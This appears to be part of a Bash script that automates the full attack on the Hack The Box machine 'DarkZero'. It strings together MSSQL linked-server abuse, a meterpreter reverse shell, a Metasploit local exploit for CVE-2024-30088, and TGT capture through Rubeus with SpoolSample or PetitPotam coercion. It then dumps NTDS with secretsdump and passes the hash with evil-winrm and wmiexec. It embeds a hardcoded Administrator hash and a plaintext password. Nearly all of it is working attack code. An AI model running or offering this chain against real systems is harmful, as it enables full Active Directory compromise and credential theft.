loot() { echo -e "\${GREEN}  [🚩]\${NC}\033[1m \$*\${NC}"; }
err()  { echo -e "\${RED}  [✗]\${NC} \$*"; }

DC01_IP="${DC01_IP}"
DC01_HOST="${DC01_HOSTNAME}"
TICKETS="${TICKETS}"
LOOT="${LOOT}"

TIX_FILE="\${1:-}"

if [[ -z "\$TIX_FILE" || ! -f "\$TIX_FILE" ]]; then
    # Check if we already have a ccache
    EXISTING=\$(ls "\${TICKETS}"/*.ccache 2>/dev/null | head -1)
    if [[ -n "\$EXISTING" ]]; then
        inf "Found existing ccache: \$EXISTING"
        TIX_FILE=""
        CCACHE_FILE="\$EXISTING"
    else
        err "Usage: \$0 <rubeus_tix.txt>"
        err "   Or place a .ccache file in: ${TICKETS}/"
        exit 1
    fi
fi

# Parse ticket if rubeus file provided
if [[ -n "\$TIX_FILE" ]]; then
    inf "Parsing Rubeus ticket file: \$TIX_FILE"
    python3 "${WORKDIR}/parse_ticket.py" "\$TIX_FILE" "\$TICKETS"
    CCACHE_FILE=\$(ls "\${TICKETS}"/*.ccache 2>/dev/null | head -1)
    if [[ -z "\$CCACHE_FILE" ]]; then
        err "No ccache file generated check parse_ticket.py output"
        exit 1
    fi
fi

ok "Using ccache: \$CCACHE_FILE"
export KRB5CCNAME="\$CCACHE_FILE"

# Verify ticket
inf "Verifying ticket with klist..."
klist 2>/dev/null && ok "Ticket valid" || wrn "klist failed ticket may still work"

# NTDS dump via DRSUAPI
inf "Dumping DC01 NTDS via Kerberos ticket (DRSUAPI method)..."
NTDS_OUT="\$LOOT/dc01_ntds.txt"
impacket-secretsdump "DC01\\\$@\${DC01_HOST}" -k -no-pass \
    -outputfile "\$LOOT/dc01_dump" 2>&1 | tee "\$NTDS_OUT"

echo ""
inf "Extracting Administrator NTLM hash from DC01..."
ADMIN_HASH=\$(grep "^Administrator:" "\$NTDS_OUT" | grep ":500:" | awk -F: '{print \$4}')

if [[ -z "\$ADMIN_HASH" ]]; then
    # Try alternate format
    ADMIN_HASH=\$(grep -i "administrator.*500.*[a-f0-9]\{32\}" "\$NTDS_OUT" | awk -F: '{print \$4}' | head -1)
fi

if [[ -z "\$ADMIN_HASH" ]]; then
    err "Could not extract Administrator hash. Manual check:"
    grep -i "administrator" "\$NTDS_OUT" | head -5
    err "Set ADMIN_HASH manually and re-run"
    exit 1
fi

echo "\$ADMIN_HASH" > "\$LOOT/admin_hash.txt"
ok "Administrator NTLM: \$ADMIN_HASH"

# evil-winrm as Administrator
inf "Connecting to DC01 as Administrator via evil-winrm..."
inf "Command: evil-winrm -i \$DC01_HOST -u Administrator -H \$ADMIN_HASH"

# Fetch flags
echo ""
MAG='\033[1;35m'
echo -e "\n\${MAG}  ╔══[ FLAG RETRIEVAL ]═══════════════════════════════════════╗\${NC}"

USER_FLAG=\$(evil-winrm -i "\$DC01_HOST" -u "Administrator" -H "\$ADMIN_HASH" \
    -s "/tmp" -e "/tmp" <<'EWRM' 2>/dev/null
type C:\Users\Administrator\Desktop\user.txt
exit
EWRM
)
USER_FLAG=\$(echo "\$USER_FLAG" | grep -Eo '[0-9a-f]{32}' | head -1)

ROOT_FLAG=\$(evil-winrm -i "\$DC01_HOST" -u "Administrator" -H "\$ADMIN_HASH" \
    -s "/tmp" -e "/tmp" <<'EWRM' 2>/dev/null
type C:\Users\Administrator\Desktop\root.txt
exit
EWRM
)
ROOT_FLAG=\$(echo "\$ROOT_FLAG" | grep -Eo '[0-9a-f]{32}' | head -1)

echo "\$USER_FLAG" > "\$LOOT/user.txt"
echo "\$ROOT_FLAG" > "\$LOOT/root.txt"

loot "user.txt : \$USER_FLAG"
loot "root.txt : \$ROOT_FLAG"

echo -e "\n\${MAG}  ╚══════════════════════════════════════════════════════════╝\${NC}\n"
echo -e "\${GREEN}  Box PWNED! All loot saved to: ${LOOT}/\${NC}\n"
FLAGSH
chmod +x "$WORKDIR/get_flags.sh"
ok "Flag retrieval script ready"

# ─── PHASE 9: MASTER ORCHESTRATION ────────────────────────────────────────────
ph "9 Running Full Attack Chain"

echo -e "\n${YELLOW}  ATTACK FLOW DIAGRAM:${NC}"
cat <<'DIAGRAM'

  ┌──────────────────────────────────────────────────────────────────┐
  │                    DarkZero Attack Chain                         │
  │                                                                  │
  │  KALI ──MSSQL──▶ DC01.darkzero.htb                             │
  │                    │                                             │
  │                    │ LINKED SERVER (john.w → dc01_sql_svc)       │
  │                    ▼                                             │
  │                  DC02.darkzero.ext                               │
  │                    │                                             │
  │            xp_cmdshell (meterpreter)                             │
  │                    │                                             │
  │              CVE-2024-30088 ──▶ SYSTEM                          │
  │                    │                                             │
  │  Rubeus monitor ◀──┤   SpoolSample coerce ──▶ DC01             │
  │       +            │              ↓                              │
  │   TGT captured ◀──┘          DC01$ TGT (forwarded)             │
  │       │                                                          │
  │       │ ticketConverter (kirbi→ccache)                           │
  │       ▼                                                          │
  │  secretsdump DC01 (DRSUAPI) ──▶ Admin hash                      │
  │       │                                                          │
  │       ▼                                                          │
  │  evil-winrm ──▶ DC01 Admin ──▶ user.txt + root.txt  🏁          │
  └──────────────────────────────────────────────────────────────────┘

DIAGRAM

# Start meterpreter handler in background via MSF
inf "Starting Metasploit meterpreter handler in background..."
msfconsole -q -r "$WORKDIR/handler.rc" 2>/dev/null &
MSF_PID=$!
PIDS+=("$MSF_PID")
ok "MSF handler started (PID: $MSF_PID)"
sleep 5

# Run MSSQL attack
inf "Executing MSSQL attack chain against DC01..."
sep
python3 "$WORKDIR/mssql_pwn.py" \
    "$DC01_IP" \
    "$LHOST" \
    "$LPORT_SHELL" \
    "$HTTP_PORT" \
    "$LPORT_METER" 2>&1 | tee "$LOGS/mssql_attack.log"
sep

# ─── PHASE 9.5: DIRECT PTH FLAG FALLBACK ───────────────────────────────────────
ph "9.5 Direct Administrator Hash Fallback"

if command -v impacket-wmiexec &>/dev/null; then
    inf "Trying direct pass-the-hash fallback with known Administrator hash..."
    inf "Target: ${DC01_IP}  |  Hash: ${ADMIN_HASH}"

    # Pull user/root directly from Administrator desktop when hash is valid.
    USER_FALLBACK=$(impacket-wmiexec \
        -hashes ":${ADMIN_HASH}" \
        "Administrator@${DC01_IP}" \
        "type C:\\Users\\Administrator\\Desktop\\user.txt" 2>/dev/null \
        | grep -Eo '[0-9a-f]{32}' | tail -1 || true)

    ROOT_FALLBACK=$(impacket-wmiexec \
        -hashes ":${ADMIN_HASH}" \
        "Administrator@${DC01_IP}" \
        "type C:\\Users\\Administrator\\Desktop\\root.txt" 2>/dev/null \
        | grep -Eo '[0-9a-f]{32}' | tail -1 || true)

    if [[ -n "$USER_FALLBACK" ]]; then
        echo "$USER_FALLBACK" > "$LOOT/user.txt"
        loot "user.txt (PTH fallback): $USER_FALLBACK"
    else
        wrn "PTH fallback did not retrieve user.txt"
    fi

    if [[ -n "$ROOT_FALLBACK" ]]; then
        echo "$ROOT_FALLBACK" > "$LOOT/root.txt"
        loot "root.txt (PTH fallback): $ROOT_FALLBACK"
    else
        wrn "PTH fallback did not retrieve root.txt"
    fi
else
    wrn "impacket-wmiexec not found skipping direct PTH fallback"
fi

# ─── PHASE 10: INTERACTIVE GUIDANCE ────────────────────────────────────────────
ph "10 Interactive Steps Required"

echo ""
echo -e "${YELLOW}  ╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}  ║              SEMI-AUTOMATED PHASE Your Actions Required        ║${NC}"
echo -e "${YELLOW}  ╚══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${CYAN}  STEP A CVE-2024-30088 Privilege Escalation (SYSTEM on DC02):${NC}"
sep
cat <<'STEPA'
  Once you see "Meterpreter session 1 opened" in the MSF handler:

  1. Open a new terminal:
     $ msfconsole -q

  2. Run:
     msf6> use exploit/windows/local/cve_2024_30088_authz_basep
     msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
     msf6> set LHOST <YOUR_LHOST>
     msf6> set LPORT 4445
     msf6> set SESSION 1
     msf6> run

  3. Verify SYSTEM:
     meterpreter> getuid
     # → Server username: NT AUTHORITY\SYSTEM

  4. hashdump DC02:
     meterpreter> hashdump
     # Copy output to: /tmp/darkzero_*/loot/dc02_hashes.txt

STEPA

echo -e "${CYAN}  STEP B Upload Tools to DC02:${NC}"
sep
cat <<STEPB
  In the SYSTEM meterpreter session:

  meterpreter> upload ${TOOLS}/Rubeus.exe C:\\Windows\\Temp\\r.exe
  meterpreter> upload ${TOOLS}/SpoolSample.exe C:\\Windows\\Temp\\SpoolSample.exe
  meterpreter> shell

STEPB

echo -e "${CYAN}  STEP C TGT Capture (Two-Terminal Operation):${NC}"
sep
cat <<'STEPC'
  Terminal 1 (DC02 SYSTEM shell):
  ─────────────────────────────────
  PS> C:\Windows\Temp\r.exe monitor /interval:5 /nowrap > C:\Windows\Temp\tix.txt
  # Keep this running!

  Terminal 2 (DC02 SYSTEM shell new meterpreter shell):
  ─────────────────────────────────────────────────────
  PS> C:\Windows\Temp\SpoolSample.exe DC01.darkzero.htb DC02.darkzero.ext

  # If SpoolSample fails, use from Kali (python3 PetitPotam):
  # python3 /opt/PetitPotam/PetitPotam.py \
  #    -u john.w -p 'RFulUtONCOL!' \
  #    DC02.darkzero.ext DC01.darkzero.htb

STEPC

echo -e "${CYAN}  STEP D Download Ticket and Get Flags:${NC}"
sep
cat <<STEPD
  After capturing TGT (Rubeus shows DC01\$ ticket with 'forwarded' flag):

  meterpreter> download C:\\Windows\\Temp\\tix.txt ${TICKETS}/tix.txt

  Then on Kali:
  $ python3 ${WORKDIR}/parse_ticket.py ${TICKETS}/tix.txt ${TICKETS}/

  # OR do it manually:
  # 1. Copy the Base64EncodedTicket from tix.txt
  # 2. echo "<BASE64>" | base64 -d > ${TICKETS}/dc01.kirbi
  # 3. impacket-ticketConverter ${TICKETS}/dc01.kirbi ${TICKETS}/dc01.ccache

  # Dump NTDS:
  $ export KRB5CCNAME=${TICKETS}/dc01.ccache
  $ impacket-secretsdump 'DC01\$'@DC01.darkzero.htb -k -no-pass

  # Get flags:
  $ evil-winrm -i DC01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726

  # On the evil-winrm shell:
  *Evil-WinRM* PS> type C:\Users\Administrator\Desktop\user.txt
  *Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt

STEPD

echo -e "${CYAN}  STEP E Auto-flag retrieval (after NTDS dump):${NC}"
sep
cat <<STEPE
  If you have a rubeus tix.txt downloaded:
  $ ${WORKDIR}/get_flags.sh ${TICKETS}/tix.txt

  If you already have a .ccache file:
  $ export KRB5CCNAME=${TICKETS}/dc01_tgt_1.ccache
  $ ${WORKDIR}/get_flags.sh

STEPE

# ─── FINAL SUMMARY ─────────────────────────────────────────────────────────────
ph "SUMMARY All Files Generated"

echo ""
echo -e "${WHITE}  Working Directory: ${CYAN}${WORKDIR}${NC}"
sep
echo -e "${CYAN}  Payloads:${NC}"
ls -lh "$PAYLOADS/" 2>/dev/null | grep -v "^total" | while IFS= read -r line; do echo "    $line"; done
echo -e "${CYAN}  Tools:${NC}"
ls -lh "$TOOLS/" 2>/dev/null | grep -v "^total" | while IFS= read -r line; do echo "    $line"; done
echo -e "${CYAN}  Scripts:${NC}"
ls -lh "$WORKDIR/"*.{sh,py,rc} 2>/dev/null | grep -v "^total" | while IFS= read -r line; do echo "    $line"; done
sep

echo -e "\n${WHITE}  Quick Reference All Commands:${NC}"
echo ""
cat <<EOF
  # 1. MSSQL (auto-run above)
  impacket-mssqlclient ${USERNAME}@${DC01_HOSTNAME} -windows-auth

  # 2. In MSF catch meterpreter from DC02 (LPORT: ${LPORT_METER})
  # use exploit/windows/local/cve_2024_30088_authz_basep -> SYSTEM

  # 3. Rubeus on DC02 (SYSTEM)
  C:\\Windows\\Temp\\r.exe monitor /interval:5 /nowrap > C:\\Windows\\Temp\\tix.txt

  # 4. Coerce (DC02 SYSTEM shell or Kali)
  C:\\Windows\\Temp\\SpoolSample.exe DC01.darkzero.htb DC02.darkzero.ext

  # 5. Convert ticket (Kali)
  echo '<BASE64>' | base64 -d > dc01.kirbi
  impacket-ticketConverter dc01.kirbi dc01.ccache
  export KRB5CCNAME=dc01.ccache

  # 6. NTDS dump
  impacket-secretsdump 'DC01\$'@DC01.darkzero.htb -k -no-pass

  # 7. Flags
  evil-winrm -i DC01.darkzero.htb -u Administrator -H <HASH>
  type C:\\Users\\Administrator\\Desktop\\user.txt
  type C:\\Users\\Administrator\\Desktop\\root.txt
EOF

echo ""
echo -e "${GREEN}  ╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}  ║     DarkZero Attack Chain Initialized! 💀 Let's dominate.        ║${NC}"
echo -e "${GREEN}  ╚══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ─── LOOT WATCHER ──────────────────────────────────────────────────────────────
# Background process to watch for flags
(
while true; do
    sleep 10
    for f in "$LOOT/user.txt" "$LOOT/root.txt"; do
        if [[ -f "$f" && -s "$f" ]]; then
            FLAG=$(cat "$f" | grep -Eo '[0-9a-f]{32}' | head -1)
            if [[ -n "$FLAG" ]]; then
                FNAME=$(basename "$f")
                echo -e "\n${GREEN}  [🚩] CAPTURED: ${FNAME} = ${FLAG}${NC}" 2>/dev/null || true
            fi
        fi
    done
done
) &
PIDS+=("$!")

# Keep script alive until user presses Ctrl+C or flags are found
echo -e "${YELLOW}  [*] Script running. Press Ctrl+C to exit.${NC}"
echo -e "${YELLOW}  [*] Logs: ${LOG_FILE}${NC}\n"

# Wait for flags or user interrupt
while true; do
    if [[ -f "$LOOT/user.txt" && -f "$LOOT/root.txt" ]]; then
        USER_F=$(cat "$LOOT/user.txt" 2>/dev/null | grep -Eo '[0-9a-f]{32}' | head -1)
        ROOT_F=$(cat "$LOOT/root.txt" 2>/dev/null | grep -Eo '[0-9a-f]{32}' | head -1)
        if [[ -n "$USER_F" && -n "$ROOT_F" ]]; then
            echo ""
            loot "BOX COMPLETE!"
            loot "user.txt → $USER_F"
            loot "root.txt → $ROOT_F"
            echo ""
            break
        fi
    fi
    sleep 15
done

echo -e "\n${MAGENTA}  Shadow Junior 😈 HTB Nepal #3 Mission Complete${NC}\n"
